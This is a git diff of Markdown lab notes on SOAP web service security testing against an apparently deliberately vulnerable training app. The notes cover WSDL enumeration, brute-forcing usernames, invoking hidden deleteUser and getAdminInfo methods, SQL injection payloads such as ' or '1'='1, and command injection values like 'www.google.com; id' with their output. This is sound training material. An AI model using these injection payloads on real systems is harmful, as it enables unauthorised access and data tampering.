@@ -11,8 +11,7 @@ It will explore the critical security vulnerabilities that threaten these servic
 
 ### Course Topic Overview
 
-- Web Service Security Testing
-- SOAP Web Service Security Testing
+- SOAP-based Web Service Security Testing (WSDL Disclosure and Method Enumeration, Invoking Hidden Methods, Testing for SQL Injection, Testing for Command Injection)
 
 ### Prerequisites
 
@@ -31,7 +30,7 @@ It will explore the critical security vulnerabilities that threaten these servic
 ---
 ---
 
-## Testing SOAP-based Web Service
+## SOAP-based Web Service Security Testing
 
 ### WSDL Disclosure and Method Enumeration
 
@@ -55,9 +54,9 @@ In this lab environment, the user will get access to a Kali GUI instance. A slig
 
 #### Lab Solution
 
-![Lab - Web Services - WSDL Enumeration 1](./assets/web_service_security_testing_lab_web_services_wsdl_enumeration_1.png)
+![Lab - Web Services - WSDL Enumeration 1](./assets/07_web_service_security_testing_lab_web_services_wsdl_enumeration_1.png)
 
-![Lab - Web Services - WSDL Enumeration 2](./assets/web_service_security_testing_lab_web_services_wsdl_enumeration_2.png)
+![Lab - Web Services - WSDL Enumeration 2](./assets/07_web_service_security_testing_lab_web_services_wsdl_enumeration_2.png)
 
 `curl 'http://demo.ine.local/webservices/soap/ws-user-account.php?wsdl'`:
 ```xml
@@ -89,18 +88,18 @@ In this lab environment, the user will get access to a Kali GUI instance. A slig
 <message name="getAdminInfoRequest"></message>📌
 <message name="getAdminInfoResponse">
   <part name="return" type="xsd:xml" /></message>
-<message name="deleteUserRequest"> 📌
-  <part name="username" type="xsd:string" /> 📌
-  <part name="password" type="xsd:string" /></message> 📌
+<message name="deleteUserRequest">📌
+  <part name="username" type="xsd:string" />📌
+  <part name="password" type="xsd:string" /></message>📌
 <message name="deleteUserResponse">
   <part name="return" type="xsd:xml" /></message>
 <portType name="ws-user-accountPortType">
   <operation name="getUser">
-    <documentation>Fetches user information if user exists else returns error message 📌
+    <documentation>Fetches user information if user exists else returns error message📌
                 &lt;br/&gt;
                 &lt;br/&gt;Sample Request (Copy and paste into Burp Repeater)
                 &lt;br/&gt;
-                &lt;br/&gt;POST /mutillidae/webservices/soap/ws-user-account.php HTTP/1.1 📌
+                &lt;br/&gt;POST /mutillidae/webservices/soap/ws-user-account.php📌 HTTP/1.1
                 &lt;br/&gt;Accept-Encoding: gzip,deflate
                 &lt;br/&gt;Content-Type: text/xml;charset=UTF-8
                 &lt;br/&gt;Content-Length: 458
@@ -171,7 +170,7 @@ In this lab environment, the user will get access to a Kali GUI instance. A slig
     <input message="tns:updateUserRequest"/>
     <output message="tns:updateUserResponse"/>
   </operation>
-  <operation name="getAdminInfo"> 📌
+  <operation name="getAdminInfo">📌
     <documentation>If account for &quot;admin&quot; exists, returns non-sensitive account details
                         &lt;br/&gt;
                         &lt;br/&gt;Sample Request (Copy and paste into Burp Repeater)
@@ -224,8 +223,8 @@ In this lab environment, the user will get access to a Kali GUI instance. A slig
 </portType>
 <binding name="ws-user-accountBinding" type="tns:ws-user-accountPortType">
   <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
-  <operation name="getUser"> 📌
-    <soap:operation soapAction="urn:ws-user-account#getUser" style="rpc"/> 📌
+  <operation name="getUser">📌
+    <soap:operation soapAction="urn:ws-user-account#getUser" style="rpc"/>📌
     <input><soap:body use="encoded" namespace="urn:ws-user-account" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></input>
     <output><soap:body use="encoded" namespace="urn:ws-user-account" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></output>
   </operation>
@@ -234,18 +233,18 @@ In this lab environment, the user will get access to a Kali GUI instance. A slig
     <input><soap:body use="encoded" namespace="urn:ws-user-account" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></input>
     <output><soap:body use="encoded" namespace="urn:ws-user-account" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></output>
   </operation>
-  <operation name="updateUser"> 📌
-    <soap:operation soapAction="urn:ws-user-account#updateUser" style="rpc"/> 📌
+  <operation name="updateUser">📌
+    <soap:operation soapAction="urn:ws-user-account#updateUser" style="rpc"/>📌
     <input><soap:body use="encoded" namespace="urn:ws-user-account" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></input>
     <output><soap:body use="encoded" namespace="urn:ws-user-account" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></output>
   </operation>
-  <operation name="getAdminInfo"> 📌
-    <soap:operation soapAction="urn:ws-user-account#getAdminInfo" style="rpc"/> 📌
+  <operation name="getAdminInfo">📌
+    <soap:operation soapAction="urn:ws-user-account#getAdminInfo" style="rpc"/>📌
     <input><soap:body use="encoded" namespace="urn:ws-user-account" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></input>
     <output><soap:body use="encoded" namespace="urn:ws-user-account" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></output>
   </operation>
-  <operation name="deleteUser"> 📌
-    <soap:operation soapAction="urn:ws-user-account#deleteUser" style="rpc"/> 📌
+  <operation name="deleteUser">📌
+    <soap:operation soapAction="urn:ws-user-account#deleteUser" style="rpc"/>📌
     <input><soap:body use="encoded" namespace="urn:ws-user-account" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></input>
     <output><soap:body use="encoded" namespace="urn:ws-user-account" encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/></output>
   </operation>
@@ -257,32 +256,32 @@ In this lab environment, the user will get access to a Kali GUI instance. A slig
 </service>
 ```
 
-![Lab - Web Services - WSDL Enumeration 3](./assets/web_service_security_testing_lab_web_services_wsdl_enumeration_3.png)
+![Lab - Web Services - WSDL Enumeration 3](./assets/07_web_service_security_testing_lab_web_services_wsdl_enumeration_3.png)
 
 `burpsuite` > `Repeater`
 
 `HTTP Request`:
 ```http
-POST /webservices/soap/ws-user-account.php HTTP/1.1 📌
+POST /webservices/soap/ws-user-account.php HTTP/1.1📌
 Accept-Encoding: gzip,deflate
 Content-Type: text/xml;charset=UTF-8
 Content-Length: 428
-Host: demo.ine.local 📌
+Host: demo.ine.local📌
 Connection: Keep-Alive
 User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 
 <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:ws-user-account">
 <soapenv:Header/>
 <soapenv:Body>
-<urn:getUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> 📌
-<username xsi:type="xsd:string">Jeremy</username> 📌
+<urn:getUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">📌
+<username xsi:type="xsd:string">Jeremy</username>📌
 </urn:getUser>
 </soapenv:Body>
 </soapenv:Envelope>
 ```
 `HTTP Response`:
 ```http
-HTTP/1.1 200 OK 📌
+HTTP/1.1 200 OK📌
 Date: Fri, 29 Nov 2024 14:56:54 GMT
 Server: Apache/2.4.7 (Ubuntu)
 X-Powered-By: PHP/5.5.9-1ubuntu4.25
@@ -297,14 +296,14 @@ Keep-Alive: timeout=5, max=100
 Connection: Keep-Alive
 Content-Type: text/xml; charset=ISO-8859-1
 
-<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getUserResponse xmlns:ns1="urn:ws-user-account"><return xsi:type="xsd:xml"><accounts message="Results for Jeremy"><account><username>jeremy</username> 📌<signature>d1373 1337 speak</signature></account></accounts></return></ns1:getUserResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
+<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getUserResponse xmlns:ns1="urn:ws-user-account"><return xsi:type="xsd:xml"><accounts message="Results for Jeremy"><account><username>jeremy</username>📌<signature>d1373 1337 speak</signature></account></accounts></return></ns1:getUserResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
 ```
 
 `burpsuite` > `Repeater`
 
 `HTTP Request`:
 ```http
-POST /webservices/soap/ws-user-account.php HTTP/1.1 📌
+POST /webservices/soap/ws-user-account.php📌 HTTP/1.1
 Accept-Encoding: gzip,deflate
 Content-Type: text/xml;charset=UTF-8
 Content-Length: 426
@@ -316,14 +315,14 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Header/>
 <soapenv:Body>
 <urn:getUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
-<username xsi:type="xsd:string">Test</username> 📌
+<username xsi:type="xsd:string">Test</username>📌
 </urn:getUser>
 </soapenv:Body>
 </soapenv:Envelope>
 ```
 `HTTP Response`:
 ```http
-HTTP/1.1 200 OK 📌
+HTTP/1.1 200 OK📌
 Date: Fri, 29 Nov 2024 15:13:47 GMT
 Server: Apache/2.4.7 (Ubuntu)
 X-Powered-By: PHP/5.5.9-1ubuntu4.25
@@ -338,7 +337,7 @@ Keep-Alive: timeout=5, max=100
 Connection: Keep-Alive
 Content-Type: text/xml; charset=ISO-8859-1
 
-<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getUserResponse xmlns:ns1="urn:ws-user-account"><return xsi:type="xsd:xml"><accounts message="User Test does not exist}" /></return></ns1:getUserResponse> 📌</SOAP-ENV:Body></SOAP-ENV:Envelope>
+<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getUserResponse xmlns:ns1="urn:ws-user-account"><return xsi:type="xsd:xml"><accounts message="User Test does not exist}" /></return></ns1:getUserResponse>📌</SOAP-ENV:Body></SOAP-ENV:Envelope>
 ```
 
 `burpsuite` > `Intruder` > `Payloads` = `Payload Options: Load: /usr/share/metasploit-framework/data/wordlists/unix_users.txt` > `Start attack`
@@ -378,7 +377,7 @@ Content-Length: 634
 Connection: close
 Content-Type: text/xml; charset=ISO-8859-1
 
-<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getUserResponse xmlns:ns1="urn:ws-user-account"><return xsi:type="xsd:xml"><accounts message="Results for admin"><account><username>admin</username> 🚩<signature>g0t r00t?</signature></account></accounts></return> 🚩</ns1:getUserResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
+<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getUserResponse xmlns:ns1="urn:ws-user-account"><return xsi:type="xsd:xml"><accounts message="Results for admin"><account><username>admin</username>🚩<signature>g0t r00t?</signature></account></accounts></return>🚩</ns1:getUserResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
 ```
 
 ### Invoking Hidden Methods
@@ -404,7 +403,7 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:ws-user-account">
 <soapenv:Header/>
 <soapenv:Body>
-<urn:deleteUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> 📌
+<urn:deleteUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">📌
 <username xsi:type="xsd:string">Jeremy</username>
 </urn:deleteUser>
 </soapenv:Body>
@@ -499,7 +498,7 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 ```
 `HTTP Response`:
 ```http
-HTTP/1.0 500 Internal Server Error 📌
+HTTP/1.0 500 Internal Server Error📌
 Date: Fri, 29 Nov 2024 16:10:33 GMT
 Server: Apache/2.4.7 (Ubuntu)
 X-Powered-By: PHP/5.5.9-1ubuntu4.25
@@ -540,7 +539,7 @@ SOAPAction: "urn:ws-user-account#getAdminInfo"📌
 ```
 `HTTP Response`:
 ```http
-HTTP/1.1 200 OK 📌
+HTTP/1.1 200 OK📌
 Date: Fri, 29 Nov 2024 16:20:38 GMT
 Server: Apache/2.4.7 (Ubuntu)
 X-Powered-By: PHP/5.5.9-1ubuntu4.25
@@ -581,8 +580,8 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:ws-user-account">
 <soapenv:Header/>
 <soapenv:Body>
-<urn:getUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> 📌
-<username xsi:type="xsd:string">Jeremy'</username> 📌
+<urn:getUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">📌
+<username xsi:type="xsd:string">Jeremy'</username>📌
 </urn:getUser>
 </soapenv:Body>
 </soapenv:Envelope>
@@ -615,7 +614,7 @@ Content-Type: text/xml; charset=ISO-8859-1
 #8 {main}</trace><diagnoticInformation>Unable to process request to web service ws-user-account->getUser()</diagnoticInformation></exception></return></ns1:getUserResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
 ```
 
-![Lab - Web Services: SQL Injection](./assets/web_service_security_testing_lab_web_services_sql_injection.png)
+![Lab - Web Services: SQL Injection](./assets/07_web_service_security_testing_lab_web_services_sql_injection.png)
 
 `burpsuite` > `Intruder`
 
@@ -632,8 +631,8 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:ws-user-account">
 <soapenv:Header/>
 <soapenv:Body>
-<urn:updateUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> 📌
-<username xsi:type="xsd:string">Jeremy'</username> 📌
+<urn:updateUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">📌
+<username xsi:type="xsd:string">Jeremy'</username>📌
 <password xsi:type="xsd:string">WeDoNotKnowit!</password>
 <signature xsi:type="xsd:string">Hacked</signature>
 </urn:updateUser>
@@ -642,7 +641,7 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 ```
 `HTTP Response`:
 ```http
-HTTP/1.1 200 OK 📌
+HTTP/1.1 200 OK📌
 Date: Fri, 29 Nov 2024 15:27:38 GMT
 Server: Apache/2.4.7 (Ubuntu)
 X-Powered-By: PHP/5.5.9-1ubuntu4.25
@@ -682,8 +681,8 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:ws-user-account">
 <soapenv:Header/>
 <soapenv:Body>
-<urn:updateUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> 📌
-<username xsi:type="xsd:string">Jeremy' or '1'='1</username> 📌
+<urn:updateUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">📌
+<username xsi:type="xsd:string">Jeremy' or '1'='1</username>📌
 <password xsi:type="xsd:string">WeDoNotKnowit!</password>
 <signature xsi:type="xsd:string">Hacked</signature>
 </urn:updateUser>
@@ -726,7 +725,7 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Header/>
 <soapenv:Body>
 <urn:getUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
-<username xsi:type="xsd:string">Jeremy</username> 📌
+<username xsi:type="xsd:string">Jeremy</username>📌
 </urn:getUser>
 </soapenv:Body>
 </soapenv:Envelope>
@@ -767,7 +766,7 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Header/>
 <soapenv:Body>
 <urn:getUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
-<username xsi:type="xsd:string">admin</username> 📌
+<username xsi:type="xsd:string">admin</username>📌
 </urn:getUser>
 </soapenv:Body>
 </soapenv:Envelope>
@@ -800,7 +799,7 @@ Content-Type: text/xml; charset=ISO-8859-1
 
 #### Lab Solution
 
-![Lab - Web Services: Command Injection](./assets/web_service_security_testing_lab_web_services_command_injection.png)
+![Lab - Web Services: Command Injection](./assets/07_web_service_security_testing_lab_web_services_command_injection.png)
 
 `burpsuite` > `Repeater`
 
@@ -819,14 +818,14 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Header/>
 <soapenv:Body>
 <urn:lookupDNS soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
-<targetHost xsi:type="xsd:string">www.google.com</targetHost> 📌
+<targetHost xsi:type="xsd:string">www.google.com</targetHost>📌
 </urn:lookupDNS>
 </soapenv:Body>
 </soapenv:Envelope>
 ```
 `HTTP Response`:
 ```http
-HTTP/1.1 200 OK 📌
+HTTP/1.1 200 OK📌
 Date: Fri, 29 Nov 2024 15:34:48 GMT
 Server: Apache/2.4.7 (Ubuntu)
 X-Powered-By: PHP/5.5.9-1ubuntu4.25
@@ -861,7 +860,7 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Header/>
 <soapenv:Body>
 <urn:lookupDNS soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
-<targetHost xsi:type="xsd:string">www.google.com; id</targetHost> 📌
+<targetHost xsi:type="xsd:string">www.google.com; id</targetHost>📌
 </urn:lookupDNS>
 </soapenv:Body>
 </soapenv:Envelope>
@@ -883,7 +882,7 @@ Keep-Alive: timeout=5, max=100
 Connection: Keep-Alive
 Content-Type: text/xml; charset=ISO-8859-1
 
-<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:lookupDNSResponse xmlns:ns1="urn:commandinjwsdl"><Answer xsi:type="xsd:xml"><results host="www.google.com; id">uid=33(www-data) gid=33(www-data) groups=33(www-data) 🚩
+<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:lookupDNSResponse xmlns:ns1="urn:commandinjwsdl"><Answer xsi:type="xsd:xml"><results host="www.google.com; id">uid=33(www-data) gid=33(www-data) groups=33(www-data)🚩
 </results></Answer></ns1:lookupDNSResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
 ```
 
@@ -904,7 +903,7 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Header/>
 <soapenv:Body>
 <urn:lookupDNS soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
-<targetHost xsi:type="xsd:string">www.google.com; pwd</targetHost> 📌
+<targetHost xsi:type="xsd:string">www.google.com; pwd</targetHost>📌
 </urn:lookupDNS>
 </soapenv:Body>
 </soapenv:Envelope>
@@ -947,7 +946,7 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 <soapenv:Header/>
 <soapenv:Body>
 <urn:lookupDNS soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
-<targetHost xsi:type="xsd:string">www.google.com; ls -al /app</targetHost> 📌
+<targetHost xsi:type="xsd:string">www.google.com; ls -al /app</targetHost>📌
 </urn:lookupDNS>
 </soapenv:Body>
 </soapenv:Envelope>
